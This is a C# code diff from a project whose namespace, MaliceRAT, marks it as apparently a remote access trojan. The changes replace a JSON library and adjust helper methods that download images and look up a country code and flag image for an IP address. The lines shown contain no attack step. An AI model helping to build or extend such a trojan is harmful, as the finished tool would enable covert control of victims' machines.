@@ -2,7 +2,7 @@
 using System.Threading.Tasks;
 using System.Net.Http;
 using System.Drawing;
-using Newtonsoft.Json.Linq;
+using System.Web.Script.Serialization;
 using System.Net;
 using System.IO;
 using System.Drawing.Imaging;
@@ -27,6 +27,7 @@ namespace MaliceRAT
                 }
             }
         }
+
         public static void SaveImage(string imageUrl, string filename, ImageFormat format)
         {    
             WebClient client = new WebClient();
@@ -42,6 +43,7 @@ namespace MaliceRAT
             stream.Close();
             client.Dispose();
         }
+
         public static async Task<string> GetCountryCodeFromIP(string ip) {
             using (var client = new WebClient()) {
                 string jsonResponse;
@@ -51,9 +53,12 @@ namespace MaliceRAT
                     throw new HttpRequestException("Request failed while trying to get country code.");
                 }
 
-                return JObject.Parse(jsonResponse)["countryCode"].ToString();
+                var jsonSerializer = new JavaScriptSerializer();
+                var jsonObject = jsonSerializer.Deserialize<dynamic>(jsonResponse);
+                return jsonObject["countryCode"];
             }
         }
+
         public static async Task<Image> GetFlagFromIP(string ip) {
             string countryCode = await GetCountryCodeFromIP(ip);
             string flagsDirectory = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "flags");
